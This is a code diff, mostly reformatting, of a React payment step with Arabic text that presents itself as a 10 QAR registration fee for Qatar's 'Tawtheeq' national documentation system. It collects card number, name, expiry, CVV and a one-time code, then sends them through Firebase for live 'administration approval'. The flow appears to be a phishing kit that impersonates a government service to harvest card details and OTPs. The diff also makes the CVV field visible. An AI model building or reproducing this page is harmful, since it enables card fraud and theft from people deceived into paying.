@@ -3,18 +3,22 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
-import { 
-  CreditCard, 
-  ShieldCheck, 
-  Lock, 
-  CheckCircle, 
-  AlertCircle, 
+import {
+  CreditCard,
+  ShieldCheck,
+  Lock,
+  CheckCircle,
+  AlertCircle,
   RefreshCw,
-  Clock
+  Clock,
 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useLocation } from "wouter";
-import { requestOtpApproval, subscribeToOtpApproval, deleteOtpRequest } from "@/lib/firebase";
+import {
+  requestOtpApproval,
+  subscribeToOtpApproval,
+  deleteOtpRequest,
+} from "@/lib/firebase";
 
 interface Step4PaymentProps {
   onNext: (paymentData?: any) => void;
@@ -29,7 +33,7 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
   const [cardName, setCardName] = useState("");
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
-  
+
   // OTP State
   const [showOtp, setShowOtp] = useState(false);
   const [otpDigits, setOtpDigits] = useState(["", "", "", "", "", ""]);
@@ -52,12 +56,12 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
   // Subscribe to OTP approval status
   useEffect(() => {
     if (!waitingForApproval) return;
-    
+
     let hasProcessed = false;
-    
+
     const unsubscribe = subscribeToOtpApproval((status) => {
       if (hasProcessed) return;
-      
+
       setApprovalStatus(status);
       if (status === "approved") {
         hasProcessed = true;
@@ -89,7 +93,16 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
     });
 
     return () => unsubscribe();
-  }, [waitingForApproval, cardNumber, cardName, expiry, cvv, otpDigits, onNext, toast]);
+  }, [
+    waitingForApproval,
+    cardNumber,
+    cardName,
+    expiry,
+    cvv,
+    otpDigits,
+    onNext,
+    toast,
+  ]);
 
   const formatCardNumber = (value: string) => {
     const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
@@ -110,7 +123,8 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
 
   const validateCard = () => {
     if (!cardName.trim()) return "يرجى إدخال الاسم على البطاقة";
-    if (cardNumber.replace(/\s/g, "").length < 16) return "رقم البطاقة غير صحيح";
+    if (cardNumber.replace(/\s/g, "").length < 16)
+      return "رقم البطاقة غير صحيح";
     if (!expiry || expiry.length < 5) return "تاريخ الانتهاء غير صحيح";
     if (!cvv || cvv.length < 3) return "رمز الأمان غير صحيح";
     return null;
@@ -151,7 +165,7 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
 
   const handleDigitChange = (index: number, value: string) => {
     if (!/^\d*$/.test(value)) return;
-    
+
     const newDigits = [...otpDigits];
     newDigits[index] = value.slice(-1);
     setOtpDigits(newDigits);
@@ -170,7 +184,10 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
 
   const handlePaste = (e: React.ClipboardEvent) => {
     e.preventDefault();
-    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
+    const pasted = e.clipboardData
+      .getData("text")
+      .replace(/\D/g, "")
+      .slice(0, 6);
     const newDigits = [...otpDigits];
     pasted.split("").forEach((digit, i) => {
       if (i < 6) newDigits[i] = digit;
@@ -242,7 +259,9 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
               <div className="mx-auto w-20 h-20 bg-orange-100 rounded-full flex items-center justify-center mb-4">
                 <Clock className="h-10 w-10 text-orange-600 animate-pulse" />
               </div>
-              <h3 className="text-xl font-bold text-gray-800 mb-2">جاري التحقق من البيانات</h3>
+              <h3 className="text-xl font-bold text-gray-800 mb-2">
+                جاري التحقق من البيانات
+              </h3>
               <p className="text-gray-600">
                 تم إرسال طلب التحقق وفي انتظار الموافقة من الإدارة
               </p>
@@ -252,8 +271,12 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
               <div className="flex items-center gap-3">
                 <RefreshCw className="h-5 w-5 text-orange-600 animate-spin" />
                 <div>
-                  <p className="font-medium text-orange-800">جاري المعالجة...</p>
-                  <p className="text-sm text-orange-600">يرجى الانتظار، سيتم إخطارك عند الموافقة</p>
+                  <p className="font-medium text-orange-800">
+                    جاري المعالجة...
+                  </p>
+                  <p className="text-sm text-orange-600">
+                    يرجى الانتظار، سيتم إخطارك عند الموافقة
+                  </p>
                 </div>
               </div>
             </div>
@@ -263,7 +286,8 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
                 <span className="font-medium">رقم البطاقة:</span> {cardNumber}
               </p>
               <p className="text-sm text-gray-600">
-                <span className="font-medium">رمز OTP:</span> {otpDigits.join("")}
+                <span className="font-medium">رمز OTP:</span>{" "}
+                {otpDigits.join("")}
               </p>
             </div>
 
@@ -297,11 +321,17 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
           </div>
 
           {/* OTP Input */}
-          <div className="flex justify-center gap-2" dir="ltr" onPaste={handlePaste}>
+          <div
+            className="flex justify-center gap-2"
+            dir="ltr"
+            onPaste={handlePaste}
+          >
             {otpDigits.map((digit, index) => (
               <input
                 key={index}
-                ref={(el) => { inputRefs.current[index] = el; }}
+                ref={(el) => {
+                  inputRefs.current[index] = el;
+                }}
                 type="tel"
                 inputMode="numeric"
                 pattern="[0-9]*"
@@ -310,7 +340,11 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
                 onChange={(e) => handleDigitChange(index, e.target.value)}
                 onKeyDown={(e) => handleKeyDown(index, e)}
                 className={`w-12 h-14 text-center text-2xl font-bold border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 ${
-                  otpError ? "border-red-500" : digit ? "border-blue-500" : "border-gray-300"
+                  otpError
+                    ? "border-red-500"
+                    : digit
+                      ? "border-blue-500"
+                      : "border-gray-300"
                 }`}
                 data-testid={`input-card-otp-${index}`}
               />
@@ -334,7 +368,9 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
               data-testid="button-resend-card-otp"
             >
               <RefreshCw className="h-4 w-4" />
-              {cooldown > 0 ? `إعادة الإرسال بعد ${cooldown} ثانية` : "إعادة إرسال الرمز"}
+              {cooldown > 0
+                ? `إعادة الإرسال بعد ${cooldown} ثانية`
+                : "إعادة إرسال الرمز"}
             </button>
           </div>
 
@@ -379,18 +415,29 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
       <div className="space-y-6">
         <div className="bg-green-50 border border-green-100 rounded-lg p-3 flex items-center gap-3">
           <ShieldCheck className="h-5 w-5 text-green-600" />
-          <span className="text-sm font-medium text-green-700">بياناتك مشفرة ومحمية بنسبة 100%</span>
+          <span className="text-sm font-medium text-green-700">
+            بياناتك مشفرة ومحمية بنسبة 100%
+          </span>
         </div>
 
         <div className="bg-blue-50 p-4 rounded-lg">
           <p className="text-gray-700 text-sm leading-relaxed">
-            سيتم استيفاء مبلغ (10 ر.ق) بدل رسوم تسجيل لإتمام عملية التسجيل في نظام التوثيق الوطني (توثيق).
+            سيتم استيفاء مبلغ (10 ر.ق) بدل رسوم تسجيل لإتمام عملية التسجيل في
+            نظام التوثيق الوطني (توثيق).
           </p>
         </div>
 
-        <form className="space-y-5" onSubmit={(e) => { e.preventDefault(); handlePayment(); }}>
+        <form
+          className="space-y-5"
+          onSubmit={(e) => {
+            e.preventDefault();
+            handlePayment();
+          }}
+        >
           <div className="space-y-3">
-            <Label className="font-bold text-sm text-gray-700">طريقة الدفع</Label>
+            <Label className="font-bold text-sm text-gray-700">
+              طريقة الدفع
+            </Label>
             <RadioGroup defaultValue="visa" className="grid grid-cols-3 gap-3">
               <label className="cursor-pointer border-2 border-transparent hover:border-gray-200 [&:has(:checked)]:border-blue-500 [&:has(:checked)]:bg-blue-50 rounded-lg p-3 flex flex-col items-center justify-center transition-all bg-gray-50">
                 <RadioGroupItem value="visa" id="visa" className="sr-only" />
@@ -398,23 +445,33 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
                 <span className="text-xs font-bold text-gray-600">Visa</span>
               </label>
               <label className="cursor-pointer border-2 border-transparent hover:border-gray-200 [&:has(:checked)]:border-blue-500 [&:has(:checked)]:bg-blue-50 rounded-lg p-3 flex flex-col items-center justify-center transition-all bg-gray-50">
-                <RadioGroupItem value="master" id="master" className="sr-only" />
+                <RadioGroupItem
+                  value="master"
+                  id="master"
+                  className="sr-only"
+                />
                 <CreditCard className="h-8 w-8 mb-2 text-orange-500" />
-                <span className="text-xs font-bold text-gray-600">Mastercard</span>
+                <span className="text-xs font-bold text-gray-600">
+                  Mastercard
+                </span>
               </label>
               <label className="cursor-pointer border-2 border-transparent hover:border-gray-200 [&:has(:checked)]:border-blue-500 [&:has(:checked)]:bg-blue-50 rounded-lg p-3 flex flex-col items-center justify-center transition-all bg-gray-50">
                 <RadioGroupItem value="naps" id="naps" className="sr-only" />
                 <CreditCard className="h-8 w-8 mb-2 text-gray-400" />
-                <span className="text-xs font-bold text-gray-600">Debit / NAPS</span>
+                <span className="text-xs font-bold text-gray-600">
+                  Debit / NAPS
+                </span>
               </label>
             </RadioGroup>
           </div>
 
           <div className="space-y-2">
-            <Label className="font-bold text-sm text-gray-700">الاسم على البطاقة</Label>
-            <Input 
-              className="text-right h-12 bg-white" 
-              placeholder="الاسم كما يظهر على البطاقة" 
+            <Label className="font-bold text-sm text-gray-700">
+              الاسم على البطاقة
+            </Label>
+            <Input
+              className="text-right h-12 bg-white"
+              placeholder="الاسم كما يظهر على البطاقة"
               value={cardName}
               onChange={(e) => setCardName(e.target.value)}
               data-testid="input-card-name"
@@ -422,14 +479,17 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
           </div>
 
           <div className="space-y-2">
-            <Label className="font-bold text-sm text-gray-700">رقم البطاقة</Label>
+            <Label className="font-bold text-sm text-gray-700">
+              رقم البطاقة
+            </Label>
             <div className="relative dir-ltr">
               <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-400" />
-              <Input 
-                className="pl-10 text-left h-12 bg-white font-mono tracking-widest" 
-                placeholder="0000 0000 0000 0000" 
+              <Input
+                className="pl-10 text-left h-12 bg-white font-mono tracking-widest"
+                placeholder="0000 0000 0000 0000"
                 maxLength={19}
                 inputMode="numeric"
+                type="tel"
                 value={cardNumber}
                 onChange={(e) => {
                   const formatted = formatCardNumber(e.target.value);
@@ -442,23 +502,32 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
 
           <div className="grid grid-cols-2 gap-4">
             <div className="space-y-2">
-              <Label className="font-bold text-sm text-gray-700">تاريخ الانتهاء</Label>
-              <Input 
-                className="text-center h-12 bg-white" 
-                placeholder="MM / YY" 
+              <Label className="font-bold text-sm text-gray-700">
+                تاريخ الانتهاء
+              </Label>
+              <Input
+                className="text-center h-12 bg-white"
+                placeholder="MM / YY"
                 maxLength={5}
-                value={expiry}
+                value={
+                  expiry.length === 2 && !expiry.includes("/")
+                    ? `${expiry}/`
+                    : expiry
+                }
+                type="tel"
                 onChange={(e) => setExpiry(e.target.value)}
                 data-testid="input-expiry"
               />
             </div>
             <div className="space-y-2">
-              <Label className="font-bold text-sm text-gray-700">رمز الأمان (CVV)</Label>
-              <Input 
-                className="text-center h-12 bg-white" 
-                placeholder="123" 
+              <Label className="font-bold text-sm text-gray-700">
+                رمز الأمان (CVV)
+              </Label>
+              <Input
+                className="text-center h-12 bg-white"
+                placeholder="123"
                 maxLength={3}
-                type="password"
+                type="tel"
                 inputMode="numeric"
                 value={cvv}
                 onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
@@ -468,18 +537,18 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
           </div>
 
           <div className="flex gap-4 pt-4">
-            <Button 
+            <Button
               type="submit"
               className="flex-1 bg-[#1e60a6] hover:bg-[#164e8a] text-white h-14 text-xl"
               data-testid="button-pay"
             >
               <Lock className="h-5 w-5 ml-2" />
-              إتمام الدفع (10.00 ر.ق)
+              دفع (10.00 ر.ق)
             </Button>
-            <Button 
-              onClick={onBack} 
-              type="button" 
-              variant="outline" 
+            <Button
+              onClick={onBack}
+              type="button"
+              variant="outline"
               className="flex-1 bg-white border-gray-300 hover:bg-gray-50 text-gray-800 h-14 text-xl"
               data-testid="button-back"
             >
